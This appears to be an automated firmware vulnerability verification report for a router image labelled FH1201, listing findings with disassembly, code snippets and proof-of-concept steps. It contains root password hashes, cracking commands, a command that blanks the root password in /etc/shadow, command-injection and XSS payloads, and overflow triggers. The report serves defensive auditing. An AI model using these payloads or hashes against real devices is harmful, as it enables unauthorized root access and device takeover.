# FH1201 - Verification Report (15 findings)

---

## Original Information

- **File/Directory Path:** `var/etc/shadow`
- **Location:** `File: shadow (Full path: /etc/shadow)`
- **Description:** In the '/etc/shadow' file, an MD5 password hash for the root user ($1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1) was found, and the file permissions are set to 777 (-rwxrwxrwx), allowing any non-root user to read, write, and execute. Specific manifestation: After an attacker logs in as a non-root user, they can directly access this file to read the password hash. Trigger condition: The attacker possesses valid login credentials (non-root user) and performs a file read operation. Constraints and boundary checks: The file lacks proper access control and permission verification. Potential attacks and exploitation methods: The attacker can read the hash and perform offline brute-force cracking (MD5 hashes are vulnerable, especially if the password is weak), and upon success, obtain root privileges; or directly modify the file content (such as clearing the root password) to escalate privileges. Related code logic or technical details: The file is a system password storage file, which should normally be restricted to root read-only, but the permission configuration here is incorrect.
- **Code Snippet:**
  ```
  File content: root:$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1:14319::::::
  ```
- **Notes:** This finding is based on clear file content and permission evidence. The attack chain is complete: non-root user reads hash → offline cracking → obtains root privileges. The MD5 hash may be easily cracked, but actual exploitability depends on password strength; it is recommended to further verify password complexity or check for other protection mechanisms (such as hash salting). Related files: No other direct associations, but it may affect system authentication components. Subsequent analysis direction: Check permissions of other sensitive files (e.g., passwd), or analyze the authentication process to confirm the scope of the vulnerability impact.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** The alert description is completely accurate. Evidence shows: 1) The file 'var/etc/shadow' has permissions 777 (-rwxrwxrwx), allowing any non-root user to read, write, and execute; 2) The file content contains the root user's MD5 password hash ($1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1). The attacker model is an authenticated non-root user. The complete attack chain is reproducible: After a non-root user logs in, they execute 'cat /etc/shadow' to read the hash, then use a tool (like John the Ripper) to perform offline cracking of the MD5 hash (if the password is weak, it is easily successful), obtaining root privileges; or directly execute 'echo "root::14319::::::" > /etc/shadow' to clear the root password, then use 'su root' to escalate privileges without a password. There is no permission verification or boundary checking, the vulnerability is practically exploitable and has a severe impact (gaining complete system control).

## Verification Metrics

- **Verification Duration:** 101.58 s
- **Token Usage:** 119089

---

## Original Information

- **File/Directory Path:** `etc_ro/shadow`
- **Location:** `shadow:1 (file path)`
- **Description:** Discovered that the 'shadow' file is readable by all users (permissions 777) and contains the root user's MD5 password hash ($1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1). An attacker (non-root user) can directly read this file, obtain the password hash, and attempt to obtain the root password through offline cracking (using tools such as John the Ripper). Once successful, the attacker can escalate privileges to root and gain full control of the device. Trigger condition is simple: the attacker possesses valid login credentials (non-root user) and can access the file system. Constraint: password strength affects cracking difficulty, but MD5 hash is relatively weak and easy to crack for common passwords. Potential attack methods include direct file reading and password cracking tool usage.
- **Code Snippet:**
  ```
  File content: root:$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1:14319::::::
  File permissions: -rwxrwxrwx
  ```
- **Notes:** This finding is based on direct evidence: the file is readable and contains sensitive hash. It is recommended to further verify password strength or check other related files (such as passwd) to confirm the complete attack surface. The attack chain is complete: from non-root user reading the file to potential privilege escalation.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** Alert description is accurate: file permissions 777 allow any user (including non-root users) to read; file content contains root user's MD5 password hash, evidence comes from 'ls -l etc_ro/shadow' (showing permissions -rwxrwxrwx) and 'cat etc_ro/shadow' (showing hash value). Attacker model is an authenticated local non-root user who can exploit this vulnerability through the following steps to achieve privilege escalation: 1. Log into the system as a non-root user; 2. Execute 'cat /etc_ro/shadow' to read the file and obtain root's MD5 hash; 3. Use tools such as John the Ripper for offline cracking (e.g., command 'john shadow'); 4. If cracking is successful, use the obtained password to log in as root or execute privileged commands. MD5 hash is relatively weak and easy to crack for common passwords, leading to complete device control. The attack chain is complete and reproducible without additional conditions.

## Verification Metrics

- **Verification Duration:** 113.28 s
- **Token Usage:** 130669

---

## Original Information

- **File/Directory Path:** `bin/httpd`
- **Location:** `httpd:0x0046eefc sym.formexeCommand`
- **Description:** In the `formexeCommand` function, the user-provided 'cmdinput' HTTP parameter is directly used to construct system commands, lacking input validation and escaping. Attackers can inject shell metacharacters (such as ; & |) to execute arbitrary commands. Trigger condition: The attacker sends an HTTP request to the `formexeCommand` processing endpoint, providing a 'cmdinput' parameter containing malicious commands. Constraint: The attacker requires valid login credentials but does not need root privileges. Potential attacks include privilege escalation, file system access, or network reconnaissance. The code logic compares user input with predefined commands (cd, ls, cat, echo, pwd, ping); if it is not a predefined command, the user input is executed directly.
- **Code Snippet:**
  ```
  // Get user input
  uVar1 = (**(iVar4 + -0x78cc))(*&uStackX_0,*(iVar4 + -0x7fd8) + -0x3bc,*(iVar4 + -0x7fd8) + -0x3b0); // websGetVar gets 'cmdinput'
  (**(iVar4 + -0x71b0))(auStack_2308,uVar1); // Copy to buffer
  // After checking predefined commands, for non-predefined commands:
  // str._s____tmp_cmdTmp.txt
  (**(iVar4 + -0x7860))(*(iVar4 + -0x7fd8) + -0x388,auStack_2308); // Build command string
  // Finally executed via doSystemCmd
  ```
- **Notes:** The exploit chain is complete: from the HTTP input point ('cmdinput') to the dangerous operation (doSystemCmd). httpd typically runs with root privileges, so command execution may gain root privileges. It is recommended to further verify the specific URL endpoint for `formexeCommand`, but code analysis shows a clear vulnerability pattern.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** The alert description is accurate. In the `formexeCommand` function, the user-provided 'cmdinput' parameter is obtained via `websGetVar`, copied to a buffer using `strcpy`, and directly used to construct a system command string (such as `"%s > /tmp/cmdTmp.txt"`), and finally executed via `doSystemCmd`. The code lacks input validation and escaping, allowing command injection. Attacker model: A remote attacker with valid login credentials (does not require root privileges). Since httpd typically runs with root privileges, command execution may gain root privileges, leading to privilege escalation, file system access, or network reconnaissance. Vulnerability exploitability verification: Input is controllable (attacker can control 'cmdinput' via HTTP request), path is reachable (for non-predefined commands, execution is direct; predefined commands may also be injectable), actual impact is severe. Proof of Concept (PoC): An attacker can send an HTTP request to the `formexeCommand` processing endpoint, providing a 'cmdinput' parameter such as `"malicious; whoami"`, which would execute the arbitrary command `malicious; whoami > /tmp/cmdTmp.txt`.

## Verification Metrics

- **Verification Duration:** 121.27 s
- **Token Usage:** 167087

---

## Original Information

- **File/Directory Path:** `lib/libwifi.so`
- **Location:** `libwifi.so:0x00022950 sym.wps_save`
- **Description:** The 'wps_save' function in 'libwifi.so' contains a command injection vulnerability due to unsanitized user input being passed directly to 'doSystemCmd'. The function takes three arguments (arg_c8h, arg_cch, arg_d0h), where 'arg_d0h' is used in formatted strings for 'doSystemCmd' calls without validation. An attacker can inject arbitrary commands by controlling 'arg_d0h', such as through semicolons or backticks, leading to command execution in the context of the process using this library. Trigger conditions include calling 'wps_save' with malicious 'arg_d0h', which could be achieved via network interfaces, IPC, or other components that invoke this function. The vulnerability allows full command execution, potentially leading to privilege escalation or system compromise if the process has elevated privileges.
- **Code Snippet:**
  ```
  0x00022950: lw a1, (arg_d0h)  ; Load user-controlled arg_d0h
  0x00022954: lw t9, -sym.imp.doSystemCmd(gp)  ; Load doSystemCmd function
  0x0002295c: jalr t9  ; Call doSystemCmd with format string 'nvram set %s_wps_mode=enabled' and a1
  Similar calls at 0x000229c8, 0x00022a24, etc., where arg_d0h is used in doSystemCmd without sanitization.
  ```
- **Notes:** This vulnerability requires that 'wps_save' is callable with user-controlled input, which may be possible through web interfaces, API endpoints, or command-line tools. Further analysis is needed to identify specific call paths and interfaces that expose this function. The library is stripped, but exported functions are accessible. Assumes the attacking user has valid login credentials and can trigger the function call. Recommended to check for input validation in callers and implement sanitization of arguments passed to 'wps_save'.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** The security alert accurately describes a command injection vulnerability. Evidence comes from Radare2 disassembly: at addresses 0x00022950, 0x000229c8, 0x00022a24, etc., arg_d0h is directly loaded into a1 and passed to doSystemCmd, used in format strings like 'nvram set %s_wps_mode=enabled' without any input sanitization. The attacker model is an authenticated user (remote or local) who can call wps_save and control arg_d0h via network interfaces, APIs, or command-line tools. Full attack chain verified: input controllable (arg_d0h is a parameter), path reachable (function executes after checking parameters are non-zero), actual impact (command execution may lead to system compromise). PoC payload example: when calling wps_save, set arg_d0h to 'wl0; touch /tmp/pwned #', which will execute 'nvram set wl0; touch /tmp/pwned #_wps_mode=enabled', where the semicolon injects the command 'touch /tmp/pwned', and comments out the subsequent string.

## Verification Metrics

- **Verification Duration:** 151.33 s
- **Token Usage:** 215687

---

## Original Information

- **File/Directory Path:** `usr/sbin/ufilter`
- **Location:** `ufilter:0x004042c0 fcn.004042c0, ufilter:0x00404450 fcn.00404450`
- **Description:** A buffer overflow vulnerability exists in the 'ufilter' binary within the URL and file type parsing functions. The vulnerability arises when processing command-line arguments for URL filtering, specifically in functions that handle comma-separated lists of URLs and file types. The functions fcn.004042c0 and fcn.00404450 use strcpy and memcpy to copy user-provided strings into a fixed-size buffer (64 bytes per entry, with up to 16 entries) without proper bounds checking. If an attacker provides a string longer than 64 bytes, it can overflow the buffer, potentially overwriting adjacent memory, including return addresses or function pointers. This can lead to arbitrary code execution or denial of service. The vulnerability is triggered when a non-root user executes 'ufilter' with the URL filter module and provides maliciously long URLs or file types via the 'set' command.
- **Code Snippet:**
  ```
  In fcn.004042c0:
  0x00404354      2000c58f       lw a1, (var_20h)  ; Load user input string
  0x00404358      bc81998f       lw t9, -sym.imp.strcpy(gp)  ; Call strcpy
  0x0040435c      00000000       nop
  0x00404360      09f82003       jalr t9  ; Execute strcpy without bounds check
  
  In fcn.00404450:
  0x004044e4      2000c58f       lw a1, (var_20h)  ; Load user input string
  0x004044e8      bc81998f       lw t9, -sym.imp.strcpy(gp)  ; Call strcpy
  0x004044ec      00000000       nop
  0x004044f0      09f82003       jalr t9  ; Execute strcpy without bounds check
  ```
- **Notes:** The vulnerability is directly exploitable via command-line arguments, and the attack chain is verifiable through code analysis. However, actual exploitation may require specific conditions, such as the binary being executable by non-root users or having sufficient privileges. Further analysis could involve testing for privilege escalation if 'ufilter' runs with elevated permissions. The functions fcn.004042c0 and fcn.00404450 are called from sym.set_url, which handles URL filter settings. Additional input points like other filter modules (e.g., MAC filtering) should be investigated for similar issues.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** The security alert accurately describes a buffer overflow vulnerability in the ufilter binary. Evidence comes from disassembled code analysis: functions fcn.004042c0 (addresses 0x00404354-0x00404360) and fcn.00404450 (addresses 0x004044e4-0x004044f0) use strcpy to copy user input into a fixed-size buffer (64 bytes per entry, up to 16 entries) without bounds checking. The function sym.set_url (addresses 0x00404704 and 0x00404750) calls these vulnerable functions, with input coming from command-line arguments (parsed via sscanf), confirming path reachability. The attacker model is a non-root user executing ufilter via the command line and passing maliciously long strings (e.g., for URL or file type filtering). The vulnerability is practically exploitable because input longer than 64 bytes can overflow the buffer, overwriting adjacent memory (such as return addresses), leading to arbitrary code execution or denial of service. PoC steps: As a non-root user, run 'ufilter set url "A"*65' or a similar command where the string exceeds 64 bytes to trigger the buffer overflow. Verification is based on the disassembled code returned by the tool, with all claims supported by evidence.

## Verification Metrics

- **Verification Duration:** 164.97 s
- **Token Usage:** 241283

---

## Original Information

- **File/Directory Path:** `usr/lib/libupnp.so`
- **Location:** `libupnp.so:0x7700 sym.upnp_device_attach`
- **Description:** Stack-based buffer overflow in the sym.upnp_device_attach function due to use of strcpy without bounds checking. The function copies a string from UPnP device data (external input) to a fixed-size stack buffer (at sp+0xa0). When a crafted UPnP message contains a device string longer than 212 bytes, it overflows the buffer and overwrites the saved return address (at sp+0x174), enabling arbitrary code execution. Trigger condition: attacker sends a malicious UPnP device announcement or similar message. Exploitation requires the attacker to control the device string content and length to overwrite the return address with shellcode or ROP chain addresses.
- **Code Snippet:**
  ```
  0x000076f8      lw t9, -sym.imp.strcpy(gp)
  0x000076fc      addiu a1, s3, 4             ; source: device data string
  0x00007700      jalr t9                     ; call strcpy
  0x00007704      move a0, s5                ; destination: stack buffer at sp+0xa0
  ```
- **Notes:** The stack buffer has a fixed size, and the distance to the return address is 212 bytes, making overflow straightforward. Assumes no stack protections (e.g., ASLR) are enabled in the firmware environment. Recommended to verify input source in upnp_ifattach and network handling functions. No other exploitable vulnerabilities found in strcpy/strcat usage after full analysis.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** The alert accurately describes a stack-based buffer overflow in sym.upnp_device_attach. The disassembly confirms strcpy is used at 0x7700 to copy from s3+4 (source, controllable via UPnP device data) to a fixed-size stack buffer at sp+0xa0 (destination). The buffer size is 212 bytes to the return address at sp+0x174, and no bounds checking is present. Under the attacker model of an unauthenticated remote attacker sending crafted UPnP messages (e.g., device announcements), the input is controllable, and the function is reachable via calls from upnp_ifattach. The overflow allows overwriting the return address, enabling arbitrary code execution. Exploitation requires a malicious UPnP message with a device string longer than 212 bytes, containing shellcode or ROP chain addresses. PoC steps: 1) Attacker crafts a UPnP message with a device string exceeding 212 bytes, embedding payload at the offset to overwrite the return address. 2) The message is sent to the target device. 3) Upon processing, strcpy overflows the buffer, hijacking control flow. This constitutes a full, exploitable chain with high risk due to remote code execution potential.

## Verification Metrics

- **Verification Duration:** 186.49 s
- **Token Usage:** 281175

---

## Original Information

- **File/Directory Path:** `etc_ro/passwd`
- **Location:** `passwd`
- **Description:** The passwd file contains encrypted passwords for multiple default user accounts (admin, support, user, nobody) all with UID 0 (root privileges). This exposes a privilege escalation vulnerability: an attacker with non-root user credentials can read the passwd file (typically world-readable) and perform offline password cracking to obtain root access. The attack chain is: 1) Attacker logs in as a non-root user; 2) Attacker reads /etc/passwd; 3) Attacker extracts password hashes; 4) Attacker uses tools like John the Ripper to crack weak passwords; 5) If successful, attacker gains root privileges. Trigger conditions include weak or default passwords, and no shadow password protection. Potential exploitation involves brute-force or dictionary attacks on the hashes.
- **Code Snippet:**
  ```
  admin:6HgsSsJIEOc2U:0:0:Administrator:/:/bin/sh
  support:Ead09Ca6IhzZY:0:0:Technical Support:/:/bin/sh
  user:tGqcT.qjxbEik:0:0:Normal User:/:/bin/sh
  nobody:VBcCXSNG7zBAY:0:0:nobody for ftp:/:/bin/sh
  ```
- **Notes:** The risk score is based on the complete attack chain and clear security impact (privilege escalation). Confidence is moderated as password strength is unverified; if passwords are default or weak, exploitation is highly likely. Recommend further analysis of password hashes for common defaults, checking for /etc/shadow file existence, and reviewing authentication mechanisms. This finding should be prioritized for password policy enforcement and shadow password implementation.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** The alert description is completely accurate: the etc_ro/passwd file contains encrypted password hashes for multiple default users (admin, support, user, nobody), all with UID 0 (root privileges), and the file permissions are world-readable (-rwxrwxrwx). The attacker model is defined as: the attacker has already obtained local non-root user shell access (for example, through a default user account or a previous vulnerability). The complete attack chain is verified: 1) Attacker logs in as a non-root user; 2) Attacker executes 'cat /etc/passwd' (at runtime, etc_ro/passwd might be mapped to /etc/passwd) to read the file; 3) Attacker extracts password hashes (such as admin:6HgsSsJIEOc2U); 4) Attacker uses tools like John the Ripper for offline cracking (for example, command: john --format=des passwd_hashes.txt); 5) If the password is weak or default (such as common default passwords), the cracking is successful, and the attacker uses the obtained password to log in as admin or another root user, gaining full root privileges. Evidence supports file readability and hash existence, the path is reachable, and the actual impact is privilege escalation. Therefore, the vulnerability truly exists, the risk is high, and it is recommended to enforce password policies and implement shadow passwords.

## Verification Metrics

- **Verification Duration:** 198.55 s
- **Token Usage:** 295536

---

## Original Information

- **File/Directory Path:** `webroot/js/gozila.js`
- **Location:** `gozila.js: ~line 650 (subForm function)`
- **Description:** There is an XSS vulnerability in the `subForm` function because the HTML generated by `genForm` only escapes double quote characters but does not handle other HTML special characters (such as `<`, `>`). When an attacker controls configuration values (via form input) and injects malicious scripts, the `subForm` function uses `innerHTML` to insert unescaped HTML into the DOM, leading to script execution. Trigger condition: An attacker, as a logged-in user, modifies form field values (e.g., via browser developer tools) and triggers a `subForm` call (e.g., by submitting the form). Exploitation method: Inject `<script>alert('XSS')</script>` or similar payloads to steal session cookies or perform administrative actions. The vulnerability relies on bypassing client-side validation, but as a logged-in user, the attacker can directly manipulate form data.
- **Code Snippet:**
  ```
  function subForm(f1, a, d, g) {
      var msg = genForm('OUT', a, d, g);
      /*DEMO*/
      if (!confirm(msg))
          return;
      /*END_DEMO*/
  
      var newElem = document.createElement("div");
      newElem.innerHTML = msg;
      f1.parentNode.appendChild(newElem);
      f = document.OUT;
      f.submit();
  }
  
  // Related functions genForm and frmAdd:
  function genForm(n, a, d, g) {
      frmHead(n, a, d, g);
      var sub = 0;
      for (var i = 0; i < CA.length; i++) {
          if (CA[i].v != CA[i].o) {
              frmAdd("SET" + sub, String(CA[i].i) + "=" + CA[i].v);
              sub++;
          }
      }
      if (frmExtraElm.length)
          OUTF += frmExtraElm;
      frmExtraElm = '';
      frmEnd();
      return OUTF;
  }
  
  function frmAdd(n, v) {
      set1 = "<input type=hidden name=" + n + " value=\"";
      v = v.replace(/\"/g, "&quot;");
      var r = new RegExp(set1 + ".*\n", "g");
      if (OUTF.search(r) >= 0)
          OUTF = OUTF.replace(r, (set1 + v + "\">\n"));
      else
          OUTF += (set1 + v + "\">\n");
  }
  ```
- **Notes:** This vulnerability requires the attacker to have already obtained login credentials, but as a non-root user, they can exploit this vulnerability to escalate privileges or compromise device security. It is recommended to further verify if the backend performs additional input filtering and to check other places where `innerHTML` is used (such as the `setpage` and `decodeSSID` functions). Subsequent analysis should focus on the backend processing flow of form submissions to confirm the complete attack chain.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `Medium`
- **Detailed Reason:** The security alert accurately describes the XSS vulnerability. Evidence comes from the webroot/js/gozila.js file: the frmAdd function (lines 506-513) only escapes double quotes and does not handle characters like <, >; the genForm function (lines 516-528) uses frmAdd to generate HTML; the subForm function (lines 533-542) uses innerHTML to insert unescaped HTML. The attacker model is a logged-in user (non-root) who can control form input (e.g., CA[i].v) and trigger a subForm call (e.g., via form submission). The vulnerability is exploitable because malicious input (e.g., <script>alert('XSS')</script>) executes scripts when parsed by innerHTML. PoC steps: 1. Access the relevant form page as a logged-in user; 2. Modify a form field value, injecting <script>alert('XSS')</script>; 3. Trigger the subForm function (e.g., submit the form); 4. Script executes, proving the vulnerability exists. Risk is Medium because authentication is required, but it can lead to session hijacking or device compromise.

## Verification Metrics

- **Verification Duration:** 208.00 s
- **Token Usage:** 302579

---

## Original Information

- **File/Directory Path:** `webroot/js/privatejs/wireless_extra.js`
- **Location:** `wireless_extra.js: wirelessScan function and fillAcc function`
- **Description:** XSS vulnerability exists in the wireless network scan result display function. When a user performs a wireless scan, parameters such as SSID, MAC address, and channel in the scan results are inserted into the DOM via innerHTML without HTML escaping. An attacker can set a malicious SSID containing JavaScript code; when a logged-in user visits the scan page and performs a scan, the XSS payload will automatically execute. Specific manifestations: 1) In the wirelessScan function, scan result data like SSID, MAC, and channel are directly used for innerHTML; 2) In the fillAcc function, SSID and other parameters are also inserted directly without escaping. Trigger condition: an attacker broadcasts a malicious SSID, and the victim uses the device's wireless scan function. Exploitation method: the injected JavaScript can steal session cookies, modify device configuration, redirect the user, or perform other malicious operations.
- **Code Snippet:**
  ```
  // In the wirelessScan function:
  nc=document.createElement('td');
  nr.appendChild(nc);
  nc.innerHTML = str[0];  // str[0] is the SSID, inserted directly
  nc.className = "td-fixed";
  nc.title = decodeSSID(str[0]);
  
  // In the fillAcc function:
  var ssid = siblings[0].innerHTML;  // Retrieved directly from the DOM
  // ...
  $("#remoteSsid").val(ssid);  // Setting the value, but it was previously inserted via innerHTML
  // Multiple innerHTML uses unescaped data
  ```
- **Notes:** This is a reflected XSS vulnerability requiring user interaction (performing a scan). Since the attacker already possesses login credentials, the vulnerability can be used for privilege escalation or persistent attacks. It is recommended to perform HTML escaping on all user input before using innerHTML. Further verification is needed regarding whether the backend filters SSID length and content, but the lack of escaping on the client side is certain. Related files: may affect other pages using the scan function.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** The security alert accurately describes the XSS vulnerability. Evidence comes from the file 'webroot/js/privatejs/wireless_extra.js': 1) In the wirelessScan function, parameters such as SSID (str[0]), MAC address (str[1]), and channel (str[2]) are inserted into the DOM table via innerHTML without any HTML escaping; 2) In the fillAcc function, the SSID is retrieved from the DOM via siblings[0].innerHTML and used directly. Attacker model: an unauthenticated remote attacker can broadcast a malicious SSID, which triggers the XSS when a logged-in user visits the wireless scan page and performs a scan. Vulnerability exploitability verification: input is controllable (SSID can be arbitrarily set by the attacker), path is reachable (user performing a scan operation is a normal function), actual impact (XSS can steal session cookies, modify device configuration, or redirect the user). Complete attack chain: attacker sets a malicious SSID (e.g., '<script>alert(document.cookie)</script>') → victim scans for wireless networks → scan results are inserted into the DOM via innerHTML → XSS automatically executes. Proof of Concept (PoC): attacker configures SSID as '<img src=x onerror=alert(1)>', after the victim performs a scan, an alert box pops up confirming XSS execution. It is recommended to perform HTML escaping on all user input before using innerHTML.

## Verification Metrics

- **Verification Duration:** 231.81 s
- **Token Usage:** 317576

---

## Original Information

- **File/Directory Path:** `etc_ro/passwd_private`
- **Location:** `File: passwd_private`
- **Description:** The file 'passwd_private' contains the root user's password hash (MD5 format: $1$nalENqL8$jnRFwb1x5S.ygN.3nwTbG1), exposing sensitive authentication information. An attacker logged in as a non-root user may be able to read this file (since files similar to /etc/passwd are typically readable by all users), extract the hash, and use offline tools (such as John the Ripper or Hashcat) to crack it. If the password strength is weak (e.g., common passwords), cracking may succeed, allowing the attacker to obtain the root password and escalate privileges. The trigger condition is that the attacker has file read permissions; lack of boundary checks includes the use of a weak hash algorithm (MD5 is vulnerable to collision and rainbow table attacks) and potentially lax file permission settings. Potential attack methods include directly cracking the hash and then switching to the root user via su or login mechanisms.
- **Code Snippet:**
  ```
  root:$1$nalENqL8$jnRFwb1x5S.ygN.3nwTbG1:0:0:root:/:/bin/sh
  ```
- **Notes:** Evidence is based on file content analysis; further verification is needed for file permissions (e.g., using 'ls -l passwd_private' to confirm non-root user read permissions) and actual password strength (e.g., through cracking tests). It is recommended to upgrade to a stronger hash algorithm (such as bcrypt or SHA-512) and restrict file access permissions to root user only. This finding may be related to other authentication components, such as login daemons.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** Alert description is accurate: The file 'etc_ro/passwd_private' contains the root user's MD5 password hash, and the file permissions are -rwxrwxrwx, allowing any logged-in user (including non-root users) to read it. The attacker model is a logged-in non-root user (local or remote) who can read the file via filesystem access. The complete attack chain has been verified: 1) The attacker reads the file (e.g., using 'cat etc_ro/passwd_private'); 2) Extracts the hash '$1$nalENqL8$jnRFwb1x5S.ygN.3nwTbG1'; 3) Uses offline tools (such as John the Ripper or Hashcat) to crack the MD5 hash (MD5 is vulnerable to rainbow table or collision attacks, and if the password strength is weak, cracking may succeed); 4) After obtaining the root password, escalates privileges via the 'su' command or login mechanisms. Evidence supports file readability and hash presence, requiring no additional conditions for exploitation. Therefore, this is a real vulnerability with a High risk level because it directly leads to privilege escalation. PoC steps: As a non-root user, execute 'cat etc_ro/passwd_private' to obtain the hash, then use a cracking tool (e.g., echo '$1$nalENqL8$jnRFwb1x5S.ygN.3nwTbG1' > hash.txt && john hash.txt) to crack it; after success, use 'su root' and enter the cracked password to switch to the root user.

## Verification Metrics

- **Verification Duration:** 133.13 s
- **Token Usage:** 167051

---

## Original Information

- **File/Directory Path:** `etc_ro/shadow_private`
- **Location:** `shadow_private:1`
- **Description:** The file 'shadow_private' has its permissions set to 777, allowing any user to read it. It contains the root user's password hash (MD5: $1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1). An attacker (non-root user) can easily read this file, extract the hash, and use offline tools (such as John the Ripper) to crack the password. If the password strength is weak, the attacker may obtain root privileges, achieving privilege escalation. The trigger condition is simple: the attacker only needs to execute a read command (such as 'cat shadow_private'). Constraints include the complexity of the password and the effectiveness of the cracking tools, but the misconfigured permissions make the attack feasible.
- **Code Snippet:**
  ```
  root:$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1:14319::::::
  ```
- **Notes:** This vulnerability stems from incorrect file permission configuration. It is recommended to immediately change the file permissions to root-only read (e.g., 600) and check if the system uses this file for authentication. Subsequently, password strength can be verified to assess the actual risk, but current evidence indicates the attack chain is complete.

## Verification Conclusion

- **Description Accuracy:** `accurate`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** The alert description is completely accurate: the file 'etc_ro/shadow_private' has permissions 777 (evidence: ls -l shows -rwxrwxrwx), and its content contains the root user's MD5 password hash (evidence: cat shows root:$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1:14319::::::). The attacker model is a non-root user (local or remote with shell access). Vulnerability exploitability verified: input is controllable (attacker can execute read commands like 'cat etc_ro/shadow_private'), path is reachable (permissions 777 allow any user to read), actual impact (after extracting the hash, using offline tools like John the Ripper to crack a weak password may lead to root privilege escalation). Complete attack chain PoC: 1. Attacker executes 'cat etc_ro/shadow_private' to obtain the hash; 2. Saves the hash to a file (e.g., hash.txt); 3. Runs 'john --format=md5crypt hash.txt' to perform cracking; 4. If the password is weak, after obtaining the plaintext, uses 'su root' or similar commands to escalate privileges. The risk is high because it involves root privilege escalation.

## Verification Metrics

- **Verification Duration:** 153.87 s
- **Token Usage:** 220233

---

## Original Information

- **File/Directory Path:** `usr/sbin/igd`
- **Location:** `igd:0x00402084 igd_osl_nat_config (function entry), igd:0x0040226c (strcat call appends user input), igd:0x00402190 (_eval call executes command)`
- **Description:** A command injection vulnerability was discovered in the 'igd' binary, allowing attackers to execute arbitrary commands via the UPnP AddPortMapping operation. The vulnerability originates from the igd_osl_nat_config function not properly filtering the user-input NewInternalClient parameter when constructing the 'igdnat' command string. Attackers can inject malicious command separators (such as semicolons or backticks) into the NewInternalClient field, causing the _eval function to execute additional commands. Trigger conditions include: attackers sending malicious UPnP requests to the /control?WANIPConnection endpoint, invoking the AddPortMapping operation, and setting a malicious NewInternalClient value. Exploitation method example: setting NewInternalClient to '127.0.0.1; malicious_command', thereby executing arbitrary commands on the device with service privileges (possibly root).
- **Code Snippet:**
  ```
  Key code snippet from the igd_osl_nat_config function:
  - 0x004020f4: sprintf builds the base command 'igdnat -i %s -eport %d -iport %d -en %d'
  - 0x0040226c: strcat appends ' -client ' and the user-controlled s1->1c field (NewInternalClient)
  - 0x00402190: _eval executes the final command string, output redirected to /dev/console
  Complete command example: 'igdnat -i eth0 -eport 80 -iport 8080 -en 1 -client 127.0.0.1; malicious_command'
  ```
- **Notes:** This vulnerability requires the attacker to have access to the UPnP service (typically listening on the local area network). It is recommended to verify the specific implementation of the _eval function to confirm command execution behavior. Additionally, the multiple uses of strcpy in the igd_portmap_add function may potentially cause buffer overflows, but the command injection attack chain is more direct and easier to exploit. Subsequent analysis should focus on whether other UPnP operations (such as DeletePortMapping) also have similar issues.

## Verification Conclusion

- **Description Accuracy:** `partially`
- **Is Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** The alert is partially accurate due to an incorrect strcat address (0x0040226c instead of 0x004022d4 for appending NewInternalClient). However, the core command injection vulnerability is valid. Evidence from disassembly shows that igd_osl_nat_config function at 0x00402084 uses sprintf at 0x004020f4 to build a base command, and strcat at 0x004022d4 appends user-controlled input from s1 + 0x1c (NewInternalClient) without sanitization. The command is executed via _eval at 0x00402190, with output redirected to /dev/console. Attackers can control NewInternalClient in UPnP AddPortMapping requests sent to /control?WANIPConnection endpoint. The path is reachable when NewInternalClient is non-empty, and no input filtering is present. Exploitation example: Set NewInternalClient to '127.0.0.1; malicious_command' to execute arbitrary commands with service privileges (likely root). This constitutes a high-risk remote code execution vulnerability.

## Verification Metrics

- **Verification Duration:** 263.15 s
- **Token Usage:** 358330

---

## Original Information

- **File/Directory Path:** `lib/modules/u_filter.ko`
- **Location:** `u_filter.ko:0x08004f68 sym.return_web_disable_page`
- **Description:** A buffer overflow vulnerability exists in the 'return_web_disable_page' function when generating HTTP redirect responses. The function uses 'sprintf' to format a response string that includes user-controlled URL data from network packets without proper length validation. Specifically, the format string 'HTTP/1.1 302 Moved Temporarily\r\nLocation: http://%s/disable.asp\r\nContent-Type: text/html; charset=iso-8859-1\r\nContent-length: %d\r\n\r\n%s' incorporates the user-provided URL via the '%s' specifier. The buffer 's2' (pointing to skb data) has limited size, and excessive input can overflow it, corrupting kernel heap memory. Attackers with network access can craft long URLs to trigger this overflow, potentially leading to code execution or denial-of-service. The vulnerability is triggered when a URL matches the filter criteria, causing 'url_filter' to call 'return_web_disable_page'.
- **Code Snippet:**
  ```
  0x08004f5c      0000053c       lui a1, $LC3                ; RELOC 32 $LC3 @ 0x080059b8
  0x08004f60      21306002       move a2, s3
  0x08004f64      21204002       move a0, s2
  0x08004f68      09f82002       jalr s1                      ; sprintf(s2, $LC3, s3, v0, s7)
  ; $LC3: "HTTP/1.1 302 Moved Temporarily\r\nLocation: http://%s/disable.asp\r\nContent-Type: text/html; charset=iso-8859-1\r\nContent-length: %d\r\n\r\n%s"
  ```
